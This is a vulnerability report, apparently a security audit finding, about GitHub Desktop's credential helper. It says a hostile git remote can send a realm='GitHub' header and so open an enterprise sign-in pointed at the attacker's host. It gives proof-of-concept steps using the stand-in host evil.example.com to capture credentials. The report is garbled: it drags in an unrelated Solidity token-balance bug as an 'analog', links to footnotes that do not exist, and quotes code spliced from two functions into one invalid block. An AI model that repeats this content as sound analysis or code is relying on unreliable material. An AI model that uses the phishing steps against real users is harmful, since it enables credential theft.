## Title
Attacker-controlled `WWW-Authenticate` header on a git remote spoofs a GitHub Enterprise endpoint, tricking Desktop into initiating an enterprise sign-in (credential exfiltration) - (`File: app/src/lib/trampoline/trampoline-credential-helper.ts`)

## Summary
The Solidity bug stems from a shared, ambiguous piece of state (`ERC20(token).balanceOf(address(this))`) being trusted to represent two logically distinct balances (`deposit` and `reward`) whenever `depositToken == rewardToken`, letting the caller drain more than they're entitled to because the code never validates which "kind" of balance it's actually looking at. The Desktop analog is `getEndpointKind()` in `trampoline-credential-helper.ts`, which classifies an arbitrary git remote as `'enterprise'` purely by trusting an attacker-suppliable `WWW-Authenticate` header value, without any cryptographic or DNS-based verification that the host is a real GitHub Enterprise instance.

## Finding Description
When Git needs credentials for a remote, it invokes Desktop's credential helper trampoline with data captured from the HTTP handshake, including any `WWW-Authenticate` headers the *remote server* returned. `getEndpointKind` uses this attacker-controlled value as a trust signal: [1](#0-0) 

If the header contains `realm="GitHub"`, the endpoint is classified as `'enterprise'` — with no verification that the host is actually running GitHub Enterprise (no TLS pinning, no `/api/v3` probe success required, no owner confirmation). This classification feeds `getCredential`: [2](#0-1) 

Since `endpointKind !== 'generic'` and no account is already bound to that attacker host, Desktop calls `ui.promptForGitHubSignIn(endpoint)`, which routes the untouched attacker-controlled `origin` straight into the app's real enterprise sign-in flow: [3](#0-2) 

`beginEnterpriseSignIn` + `setSignInEndpoint(origin)` will drive the standard "Sign in to your GitHub Enterprise instance" UI, but pointed at the attacker's server instead of a real GHE deployment. This is the "excess" analog: the code assumes the *single* signal (`WWW-Authenticate` header text) unambiguously proves the identity/trustworthiness of the endpoint, the same way `Streaming.recoverTokens` assumed `balanceOf` unambiguously represented one token's ledger.

## Impact Explanation
A user cloning/fetching from (or being redirected/proxied through) an attacker-controlled git remote can have Desktop autonomously pop the GitHub Enterprise sign-in dialog targeting the attacker's host. Depending on which enterprise auth flow is selected by the user in that dialog (basic auth vs. OAuth device flow), this can result in:
- The user's GitHub Enterprise username/password being submitted directly to the attacker's server (`fetchUser`/basic auth path uses `apiEndpoint` derived from the attacker `origin`).
- An OAuth/device-flow authorization for a "GitHub Enterprise" endpoint that is actually attacker infrastructure, allowing capture of any codes/tokens exchanged.

This matches the "unauthorized OAuth or account binding" / "credential exfiltration" impact classes: it happens purely from fetching/cloning a hostile remote, no local access, no admin rights, and no unnatural steps beyond the normal act of adding/using a remote that a user would reasonably trust (e.g., typo-squatted or compromised self-hosted git server).

## Likelihood Explanation
Any git server response is fully attacker-controlled when the user adds an untrusted remote, is redirected via HTTP(S) to an attacker-controlled endpoint, or is subject to a MITM/compromised-proxy scenario (matching the "attacker controls...a git remote/proxy response" criterion). Setting a custom `WWW-Authenticate: Basic realm="GitHub"` response header requires no privileged access — it's a normal HTTP feature any git-over-HTTP server implementation can emit. The only gate is that Desktop must not already have an account bound to that origin, which is the common case for any new/unknown remote.

## Recommendation
Do not classify a remote as `'enterprise'` (i.e., a legitimate GitHub-owned/operated host) based solely on a self-reported `WWW-Authenticate` realm string. At minimum:
- Require a successful, authenticated probe against a known GitHub API marker (e.g., `/api/v3/meta` returning the expected `X-GitHub-Request-Id` and product identification headers) before trusting `'enterprise'` classification.
- Never auto-launch `beginEnterpriseSignIn`/`setSignInEndpoint` for a host the user has not explicitly registered as a GitHub Enterprise server; instead, surface a clear "this looks like it might be a GitHub Enterprise host — do you trust `<origin>`?" confirmation before initiating any sign-in flow tied to real GitHub OAuth/device-code exchange.
- Track provenance of the `wwwauth` signal (i.e., mark it as untrusted network input) separately from internally-derived endpoint state so it can't silently promote an arbitrary host into the same code path used for verified GitHub endpoints.

## Proof of Concept
1. Attacker hosts a git-over-HTTPS server at `https://evil.example.com/repo.git` and configures it to answer unauthenticated `git-upload-pack`/`info/refs` requests with `WWW-Authenticate: Basic realm="GitHub"`.
2. Victim adds this remote in GitHub Desktop (e.g., `git remote add origin https://evil.example.com/repo.git`) and performs a fetch/pull/clone.
3. Git invokes Desktop's trampoline credential helper with the captured `wwwauth[]` header; `getEndpointKind` (`app/src/lib/trampoline/trampoline-credential-helper.ts:137-179`) returns `'enterprise'`.
4. `getCredential` finds no bound account for `evil.example.com` and calls `ui.promptForGitHubSignIn('https://evil.example.com')`.
5. `promptForGitHubSignIn` (`app/src/lib/trampoline/trampoline-ui-helper.ts:80-104`) calls `beginEnterpriseSignIn` and `setSignInEndpoint('https://evil.example.com')`, launching Desktop's real GitHub Enterprise sign-in UI against the attacker's origin.
6. Any credentials or OAuth exchange the victim completes in that dialog are sent to `evil.example.com`, not a legitimate GitHub Enterprise instance.

/** Implementation of the 'get' git credential helper command */
async function getCredential(cred: Credential, store: Store, token: string) {
  const ghCred = await getGitHubCredential(cred, store)

  if (ghCred) {
    return ghCred
  }

  const endpointKind = await getEndpointKind(cred, store)
  const accounts = await store.getAll()

  const endpoint = `${getCredentialUrl(cred)}`
  const apiEndpoint = getAPIEndpoint(endpoint)

  // If it appears as if the endpoint is a GitHub host and we don't have an
  // account for that endpoint then we should prompt the user to sign in.
  if (
    endpointKind !== 'generic' &&
    !accounts.some(a => a.endpoint === apiEndpoint)
  ) {
    if (getIsBackgroundTaskEnvironment(token)) {
      debug('background task environment, skipping prompt')
      return undefined
    }

    const account = await ui.promptForGitHubSignIn(endpoint)

    if (!account) {
      setHasRejectedCredentialsForEndpoint(token, endpoint)
    }

    return credWithAccount(cred, account)
  }

  // When Git attempts to authenticate with a host it captures any
  // WWW-Authenticate headers and forwards them to the credential helper. We
  // use them as a happy-path to determine if the host is a GitHub host without
  // having to resort to making a request ourselves.
  for (const [k, v] of cred.entries()) {
    if (k.startsWith('wwwauth[')) {
      if (v.includes('realm="GitHub"')) {
        return 'enterprise'
      } else if (/realm="(GitLab|Gitea|Atlassian Bitbucket)"/.test(v)) {
        return 'generic'
      }
    }
  }

  public promptForGitHubSignIn(endpoint: string): Promise<Account | undefined> {
    return new Promise<Account | undefined>(async resolve => {
      const cb = (result: SignInResult) => {
        resolve(result.kind === 'success' ? result.account : undefined)
        this.dispatcher.closePopup(PopupType.SignIn)
      }

      const { hostname, origin } = new URL(endpoint)
      if (hostname === 'github.com') {
        this.dispatcher.beginDotComSignIn(cb)
      } else {
        this.dispatcher.beginEnterpriseSignIn(cb)
        await this.dispatcher.setSignInEndpoint(origin)
      }

      this.dispatcher.showPopup({
        type: PopupType.SignIn,
        isCredentialHelperSignIn: true,
        credentialHelperUrl: endpoint,
      })
    }).catch(e => {
      log.error(`Could not prompt for GitHub sign in`, e)
      return undefined
    })
  }
